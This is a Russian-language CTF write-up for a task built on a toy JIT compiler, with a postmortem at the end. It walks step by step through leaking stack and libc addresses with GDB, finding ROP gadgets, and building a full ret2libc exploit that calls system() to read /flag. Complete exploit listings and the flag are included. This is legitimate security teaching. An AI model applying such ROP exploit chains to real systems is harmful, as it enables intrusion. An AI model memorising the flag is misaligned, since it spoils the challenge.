# Очень удалённый доступ: Write-up

В этот раз нас просят написать программу на том же языке, что и раньше, но вместо виртуальной машины, написанной на Python, дают «компилятор», транслирующий программу в ассемблер x86-64.

Отправляемся разбираться в коде. Видим, что инструкции транслируются практически дословно: вместо регистров `a`, `b`, `c`, `d` используются `rax`, `rbx`, `rcx`, `rdx`, арифметические операции используются аналогичные, `push` и `pop` остается как есть, а `jmp` и условные прыжки превращаются в прыжки на метку.

В арифметических операциях ничего плохого нет, в прыжках на метку, название которой нельзя сделать произвольным (а в libc ни один символ на `L` не начинается), — тоже. А вот то, что `push` умеет записывать больше чисел, чем влезает в 4096-байтный стек, а `pop` умеет читать из пустого стека, уже интересно.

Поймем сначала, какое вообще состояние программы при запуске пользовательского кода. Для этого отредактируем скрипт `jitvm.py` так, чтобы он просто компилировала программу, а запускать ее будем уже под GDB. Мы для удобства будем использовать расширение GDB — [gef](https://github.com/hugsy/gef).

Запустим JIT без аргументов на программе

```asm
lbl:
jmp "lbl"
```

Остановим ее на бесконечном цикле и посмотрим на листинг дизассемблера (команда `disas`):

```nasm
...
   0x00005555555551eb <+130>:	mov    rdi,rsp
   0x00005555555551ee <+133>:	test   rcx,rcx
   0x00005555555551f1 <+136>:	je     0x5555555551fb <main+146>
   0x00005555555551f3 <+138>:	dec    rcx
   0x00005555555551f6 <+141>:	push   QWORD PTR [rsi+rcx*8]
   0x00005555555551f9 <+144>:	jmp    0x5555555551ee <main+133>
   0x00005555555551fb <+146>:	xor    rax,rax
   0x00005555555551fe <+149>:	xor    rbx,rbx
   0x0000555555555201 <+152>:	xor    rcx,rcx
   0x0000555555555204 <+155>:	xor    rdx,rdx
=> 0x0000555555555207 <+158>:	jmp    0x555555555207 <main+158>
   0x0000555555555209 <+160>:	xor    rcx,rcx
   0x000055555555520c <+163>:	cmp    rsp,rdi
   0x000055555555520f <+166>:	jae    0x555555555219 <main+176>
   0x0000555555555211 <+168>:	pop    QWORD PTR [rsi+rcx*8]
   0x0000555555555214 <+171>:	inc    rcx
   0x0000555555555217 <+174>:	jmp    0x55555555520c <main+163>
...
```

`jmp` на себя и есть наша скомпилированная программа.

Командой `push` мы можем только перетереть уже существующие данные. Например, можно перетереть адрес возврата функции `main`, чтобы совершить [return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack). Но вот на что их перетирать, не очень понятно, потому что программа собирается с ASLR, и адреса функций и данных мы не знаем:

```c
gef➤  checksec
[+] checksec for '/tmp/a.out'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

Поэтому сначала посмотрим, какие данные уже лежат на стеке — их мы сможем достать через `pop`:

```c
gef➤  gef config context.nb_lines_stack 50
gef➤  context stack
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc30│+0x0000: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"	 ← $rsp, $rdi
0x00007fffffffdc38│+0x0008: 0x0000000100000000
0x00007fffffffdc40│+0x0010: 0x0000000000000000
0x00007fffffffdc48│+0x0018: 0x0000000000000000
0x00007fffffffdc50│+0x0020: 0x0000000000000000
0x00007fffffffdc58│+0x0028: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdc60│+0x0030: 0x0000000000000001	 ← $rbp
0x00007fffffffdc68│+0x0038: 0x00007ffff7c23510  →   mov edi, eax
0x00007fffffffdc70│+0x0040: 0x0000000000000000
0x00007fffffffdc78│+0x0048: 0x0000555555555169  →  <main+0> endbr64 
0x00007fffffffdc80│+0x0050: 0x0000000100000000
0x00007fffffffdc88│+0x0058: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdc90│+0x0060: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdc98│+0x0068: 0x6404d21499a442e8
0x00007fffffffdca0│+0x0070: 0x0000000000000000
0x00007fffffffdca8│+0x0078: 0x00007fffffffdd88  →  0x00007fffffffe10b  →  "SHELL=/bin/bash"
0x00007fffffffdcb0│+0x0080: 0x0000555555557da8  →  0x0000555555555120  →  <__do_global_dtors_aux+0> endbr64 
0x00007fffffffdcb8│+0x0088: 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
0x00007fffffffdcc0│+0x0090: 0x9bfb2deb214642e8
0x00007fffffffdcc8│+0x0098: 0x9bfb3d90f02e42e8
0x00007fffffffdcd0│+0x00a0: 0x0000000000000000
0x00007fffffffdcd8│+0x00a8: 0x0000000000000000
0x00007fffffffdce0│+0x00b0: 0x0000000000000000
0x00007fffffffdce8│+0x00b8: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdcf0│+0x00c0: 0x00007fffffffdd78  →  0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdcf8│+0x00c8: 0xe94ab33832106f00
0x00007fffffffdd00│+0x00d0: 0x0000000000000000
0x00007fffffffdd08│+0x00d8: 0x00007ffff7c235c9  →  <__libc_start_main+137> mov r15, QWORD PTR [rip+0x1d29a0]        # 0x7ffff7df5f70
0x00007fffffffdd10│+0x00e0: 0x0000555555555169  →  <main+0> endbr64 
0x00007fffffffdd18│+0x00e8: 0x0000555555557da8  →  0x0000555555555120  →  <__do_global_dtors_aux+0> endbr64 
0x00007fffffffdd20│+0x00f0: 0x00007ffff7ffe2e0  →  0x0000555555554000  →  0x00010102464c457f
0x00007fffffffdd28│+0x00f8: 0x0000000000000000
0x00007fffffffdd30│+0x0100: 0x0000000000000000
0x00007fffffffdd38│+0x0108: 0x0000555555555080  →  <_start+0> endbr64 
0x00007fffffffdd40│+0x0110: 0x00007fffffffdd70  →  0x0000000000000001
0x00007fffffffdd48│+0x0118: 0x0000000000000000
0x00007fffffffdd50│+0x0120: 0x0000000000000000
0x00007fffffffdd58│+0x0128: 0x00005555555550a5  →  <_start+37> hlt 
0x00007fffffffdd60│+0x0130: 0x00007fffffffdd68  →  0x0000000000000038 ("8"?)
0x00007fffffffdd68│+0x0138: 0x0000000000000038 ("8"?)
0x00007fffffffdd70│+0x0140: 0x0000000000000001
0x00007fffffffdd78│+0x0148: 0x00007fffffffe100  →  "/tmp/a.out"
0x00007fffffffdd80│+0x0150: 0x0000000000000000
0x00007fffffffdd88│+0x0158: 0x00007fffffffe10b  →  "SHELL=/bin/bash"	 ← $r13
0x00007fffffffdd90│+0x0160: 0x00007fffffffe11b  →  "SESSION_MANAGER=local/ivanqs-macbook-pro:@/tmp/.IC[...]"
0x00007fffffffdd98│+0x0168: 0x00007fffffffe185  →  "QT_ACCESSIBILITY=1"
0x00007fffffffdda0│+0x0170: 0x00007fffffffe198  →  "COLORTERM=truecolor"
0x00007fffffffdda8│+0x0178: 0x00007fffffffe1ac  →  "XDG_CONFIG_DIRS=/etc/xdg/xdg-gnome:/etc/xdg"
0x00007fffffffddb0│+0x0180: 0x00007fffffffe1d8  →  "SSH_AGENT_LAUNCHER=openssh"
0x00007fffffffddb8│+0x0188: 0x00007fffffffe1f3  →  "XDG_MENU_PREFIX=gnome-"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

На самой верхушке стека лежит явно адрес другого объекта на стеке (это мы понимаем исходя из того, что `0x00007fffff...` в Linux практически всегда соответствует стеку). При запуске программы несколько раз относительное расположение значений на стеке не должно измениться, поэтому если сейчас в GDB мы можем посчитать, что

```c
gef➤  p/d 0x00007fffffffdd78 - (long long)$rsp
$1 = 328
```

то в своем эксплоите мы можем написать

```asm
pop a
sub a 328
```

и быть уверены, что `a` указывает на самое начало стека программы ВЯК. Это явно нам пригодится в будущем, потому что положить шеллкод мы сможем только на стек, а чтобы его запустить, нужно знать, где этот стек вообще находится.

Чтобы понять, где вообще лежит libc, можно использовать `vmmap`:

```c
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/a.out
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/a.out
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/a.out
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/a.out
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/a.out
0x0000555555559000 0x0000555555561000 0x0000000000000000 rw- [heap]
0x00007ffff7c00000 0x00007ffff7c22000 0x0000000000000000 r-- /home/ivanq/moonshot/libc.so.6
0x00007ffff7c22000 0x00007ffff7d9b000 0x0000000000022000 r-x /home/ivanq/moonshot/libc.so.6
0x00007ffff7d9b000 0x00007ffff7df2000 0x000000000019b000 r-- /home/ivanq/moonshot/libc.so.6
0x00007ffff7df2000 0x00007ffff7df6000 0x00000000001f1000 r-- /home/ivanq/moonshot/libc.so.6
0x00007ffff7df6000 0x00007ffff7df8000 0x00000000001f5000 rw- /home/ivanq/moonshot/libc.so.6
0x00007ffff7df8000 0x00007ffff7e05000 0x0000000000000000 rw- 
0x00007ffff7fbc000 0x00007ffff7fc1000 0x0000000000000000 rw- 
0x00007ffff7fc1000 0x00007ffff7fc5000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc5000 0x00007ffff7fc7000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc7000 0x00007ffff7fc8000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc8000 0x00007ffff7ff1000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x000000000002a000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000034000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000036000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

Видим, что нам повезло, и указатель куда-то внутрь libc лежал на `$rsp + 0x0038`. Это значит, что еще несколько `pop`'ов спустя мы получаем адрес инструкции в libc:

```asm
pop b
pop b
pop b
pop b
pop b
pop b
pop b
```

Осталось прибавить константу, чтобы `b` указывало на функцию `system`:

```c
gef➤  p/d (long long)system - 0x00007ffff7c23510
$2 = 176144
```

```asm
add b 176144
```

Наконец, осталось придумать, как передать `system` аргумент. В Linux x86-64 первый параметр функции передается через регистр `rdi`, а по коду jitvm видно, что `rdi` не изменяется во время работы программы и указывает на данные, который мы изменить особо не можем. Поэтому придется изменить сам регистр `rdi`, например, найдя в libc или памяти программы код, выглядящий как `pop rdi; ret` или что-то похожее. В таком случае мы сможем положить на стек адрес этого кода и рядом адрес `system`, и процессор при выходе из `main` сначала «вернется» в `pop rdi; ret`, достанет `rdi` со стека, а потом «вернется» в `system` с нужным значением аргумента. Называется этот метод [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).

```shell
$ ropper -f /tmp/a.out --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
```

Не повезло. Дальше можно было бы попытаться искать более сложные гаджеты, например, сначала сделать `pop` в другой регистр, а потом `mov rdi, ...`, но и такого не найдется.

Придется вспомнить, что помимо программы у нас есть еще и libc, и поискать там:

```shell
$ ropper -f libc.so.6 --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: libc.so.6
```

```asm
0x000000000008975d: pop rdi; add dword ptr [rcx + rcx*4 - 0x11], ecx; call qword ptr [rax + 0x18]; 
0x00000000000e6ecf: pop rdi; add eax, 0x83480000; mov ebp, 0xfffffb20; add byte ptr [rdi], cl; test dword ptr [rax - 0x9fffff7], edi; ret; 
0x0000000000195522: pop rdi; add edi, esi; ret; 
0x00000000001788a7: pop rdi; add rax, rdi; shr rax, 2; vzeroupper; ret; 
0x0000000000172877: pop rdi; add rax, rdi; vzeroupper; ret; 
0x00000000001796b5: pop rdi; add rdi, 0x21; add rax, rdi; vzeroupper; ret; 
0x00000000001604ae: pop rdi; add rsp, 0x10; pop rbx; ret; 
0x000000000005cf7b: pop rdi; add rsp, 0x1018; pop rbx; pop rbp; ret; 
0x000000000011e741: pop rdi; call rax; 
0x000000000011e741: pop rdi; call rax; mov rdi, rax; mov eax, 0x3c; syscall; 
0x000000000013a955: pop rdi; cmp ecx, dword ptr [rax]; add al, ch; mov ebp, edi; jmp qword ptr [rsi - 0x70]; 
0x0000000000178197: pop rdi; cmp esi, dword ptr [rdi + rax]; jne 0x1781a4; add rax, rdi; vzeroupper; ret; 
0x000000000017486b: pop rdi; cmp sil, byte ptr [rdi + rax]; jne 0x174879; add rax, rdi; vzeroupper; ret; 
0x000000000004598e: pop rdi; idiv edi; jmp qword ptr [rsi + 0xf]; 
0x000000000015c38f: pop rdi; in al, dx; dec dword ptr [rax - 0x77]; ret; 
0x0000000000026ca5: pop rdi; jmp rax; 
0x00000000000e2da4: pop rdi; jmp rdi; 
0x00000000000f1a2d: pop rdi; mov cl, 0xff; inc dword ptr [rcx - 0x77]; ret; 
0x00000000000e2d84: pop rdi; mov eax, 0x3a; syscall; 
0x000000000011fe08: pop rdi; or eax, 0x64d8f700; mov dword ptr [rcx], eax; or rax, 0xffffffffffffffff; ret; 
0x0000000000023e75: pop rdi; pop rbp; ret; 
0x000000000003dc3d: pop rdi; rcl byte ptr [rdi], 0; call 0x33550; xor eax, eax; ret; 
0x0000000000126838: pop rdi; sbb byte ptr [rax + 0x39], cl; ret; 
0x000000000012686d: pop rdi; sbb byte ptr [rax - 0x77], cl; ret 0x2948; 
0x000000000016aebd: pop rdi; sbb eax, 0x8b48fff2; and al, 8; add rsp, 0x10; pop rbx; ret; 
0x0000000000198a10: pop rdi; xor eax, eax; add rsp, 0x38; ret; 
0x0000000000023b65: pop rdi; ret; 
```

Совсем другое дело. Последний гаджет, кажется, поможет нам больше всего.

```c
gef➤  p/d (long long)system - (0x00007ffff7c00000 + 0x0000000000023b65)
$3 = 174523
```

(`0x00007ffff7c00000` — начальный адрес libc, как видно из vmmap)

```asm
mov c b
sub c 174523
```

Осталось понять, что же класть в `rdi`. Туда мы положим как раз адрес на стеке JIT-программы, в который через `push` положим шелл-код, например, `ls -l /`. Это 8 байт, включая нулевой. Эту 8-байтовую бинарную строку нужно перевести в 64-битное число, которое при push'е превратится в то, что нужно. Вспоминая, что x86-64 использует little-endian, получаем это число так:

```shell
$ echo $((0x$(printf "ls -l /\0" | rev | xxd -p)))
13264972891059052
```

Наконец, поймем, где лежит адрес возврата main, то бишь что перетирать. Для этого можно, например, посмотреть текущий `rsp`:

```c
gef➤  p $rsp
$4 = (void *) 0x7fffffffdc30
```

Потом поставить breakpoint на выход из `main` и пропустить текущую инструкцию `jmp $`:

```c
gef➤  disas
Dump of assembler code for function main:
...
   0x0000555555555204 <+155>: xor    rdx,rdx
=> 0x0000555555555207 <+158>: jmp    0x555555555207 <main+158>
   0x0000555555555209 <+160>: xor    rcx,rcx
...
   0x0000555555555268 <+255>: mov    rbx,QWORD PTR [rbp-0x8]
   0x000055555555526c <+259>: leave
   0x000055555555526d <+260>: ret

gef➤  b *0x000055555555526d
Breakpoint 1 at 0x55555555526d: file <stdin>, line 52.

gef➤  jump *0x0000555555555209
Continuing at 0x555555555209.
...

gef➤  p/d ((long long)$rsp - 0x7fffffffdc30) / 8
$4 = 7
```

Получается, чтобы перетереть адрес возврата, нужно 8 раз сделать `pop` и затем `push`'ем положить правильное значение. Учитывая то, что у нас на стеке помимо адреса `pop rdi; ret` должно лежать еще и значение `rdi` и адрес `system`, и то, что мы уже сделали `pop` 8 несколько раз, получаем

```asm
pop d
pop d
push b
push a
push c
```

Объединяя все написанное выше и не забывая в начале эксплоита положить на стек шелл-код, получаем:

```asm
// Шелл-код
mov a 13264972891059052
push a
// Сдвигаем указатель обратно, как было раньше
pop a

// Достаем адрес стека
pop a
sub a 328
// Сдвигаем на 8 байт, чтобы указывало в начало шелл-кода
sub a 8

// Получаем адрес system
pop b
pop b
pop b
pop b
pop b
pop b
pop b
add b 176144

// Получаем адрес pop rdi; ret
mov c b
sub c 174523

// Кладем на стек подряд адрес pop rdi; ret, адрес шелл-кода и адрес system
pop d
pop d
push b
push a
push c
```

И... это не работает. Почему же? Запускаем gdb заново и видим:

```c
$rsp   : 0x00007fffffffd8e8  →  0x00007ffff7fd80d1  →   mov r13, rax
...
   0x7ffff7c4e1f4                  mov    QWORD PTR [rsp+0x60], r12
   0x7ffff7c4e1f9                  mov    r9, QWORD PTR [rax]
   0x7ffff7c4e1fc                  lea    rsi, [rip+0x167fb1]        # 0x7ffff7db61b4
 → 0x7ffff7c4e203                  movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7ffff7c4e208                  mov    QWORD PTR [rsp+0x68], 0x0
   0x7ffff7c4e211                  call   0x7ffff7d0b3e0 <posix_spawn>
   0x7ffff7c4e216                  mov    rdi, rbx
   0x7ffff7c4e219                  mov    r12d, eax
   0x7ffff7c4e21c                  call   0x7ffff7d0b2e0 <posix_spawnattr_destroy>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "a.out", stopped 0x7ffff7c4e203 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7c4e203 → movaps XMMWORD PTR [rsp+0x50], xmm0
```

Ошибка происходит из-за того, что инструкция movaps ожидает, что ее аргумент будет выровнен по 16 байт, а `rsp` отстоит от выравнивания на 8 байт. Произошло это потому, что функции C ожидают, что при вызове стек выровнен, а за счет того, что мы использовали ROP, это выравнивание поехало. Чтобы это исправить, достаточно перед вызовом `system` вставить еще один пустой гаджет — просто иструкцию ret. Для этого можно просто взять гаджет `pop rdi; ret` и отбросить от него первую инструкцию `pop rdi`, которая занимает 1 байт. Таким образом, последний блок эксплоита можно заменить на:

```asm
// Кладем на стек подряд адрес pop rdi; ret, адрес шелл-кода, адрес ret и адрес system
pop d
pop d
pop d
mov d c
add d 1
push b
push d
push a
push c
```

Еще одна проблема заключается в том, что если запустить этот код после исправления под `strace`, можно увидеть, что `system` на самом деле запускает шелл с пустым аргументом, хотя `rdi` устанавливается и правильно:

```shell
$ strace -f /tmp/a.out
...
[pid 137289] execve("/bin/sh", ["sh", "-c", ""], 0x7fff36527f28 /* 63 vars */ <unfinished ...>
...
```

Дело здесь, по-видимому, в том, что шеллкод расположен на стеке, который использует сам вызов `system`. Поэтому придется перенести его либо сильно ниже, либо чуть выше адреса возврата `main`. Сделать можно и так, и так; второй способ надежнее, поэтому в разборе предлагается следовать ему.

Наконец, можно заняться украшательствами и добиться того, чтобы программа не крашилась после `system`, а вызывала функцию `exit`, но это уже необязательно.

Окончательный эксплоит выглядит так:

```asm
// Достаем адрес стека
pop a
sub a 328
// Сдвигаем на 88 байт вперед, чтобы указывало в начало шелл-кода
add a 88

// Получаем адрес system
pop b
pop b
pop b
pop b
pop b
pop b
pop b
add b 176144

// Получаем адрес pop rdi; ret
mov c b
sub c 174523

// Кладем на стек подряд шелл-код, адрес pop rdi; ret, адрес шелл-кода, адрес ret и адрес system
pop d
pop d
pop d
pop d
mov d 13264972891059052
push d
mov d c
add d 1
push b
push d
push a
push c
```

Запуская этот эксплоит на удаленном сервере, находим в корне файл `/flag`.

Чтобы заменить команду `ls -l /` на `cat /flag`, недостаточно просто изменить число, которое кладется на стек, ведь `cat /flag` с нулевым байтом занимает 10 байт, что не влезает в одно машинное слово:

```shell
$ printf "cat /flag\0" | rev | xxd -p
67616c662f20746163

$ echo $((0x67)) $((0x616c662f20746163))
103 7020098271757754723
```

Придется делать `push` дважды. Таким образом, последний блок эксплоита заменяется на:

```asm
// Кладем на стек подряд шелл-код, адрес pop rdi; ret, адрес шелл-кода, адрес ret и адрес system
pop d
pop d
pop d
pop d
pop d
mov d 103
push d
mov d 7020098271757754723
push d
mov d c
add d 1
push b
push d
push a
push c
```

Флаг: **ugra_friendly_reminder_that_web_browsers_use_jit_too_mb138bt6eu22**


## Постмортем

Ближе к концу соревнования, когда задание так и не было решено участниками, мы упростили задачу, заменим динамическую линковку на статическую с фиксированными адресами. Это значит, что не нужно было вычислять адреса чего-либо, кроме стека, и эксплоит можно было сильно упростить:

```asm
pop a
sub a 432

pop d
pop d
pop d
pop d
pop d
pop d
pop d
pop d
pop d
pop d
pop d

mov d 13264972891059052
push d
push 4246144
push 4202044
push a
push 4202043
```
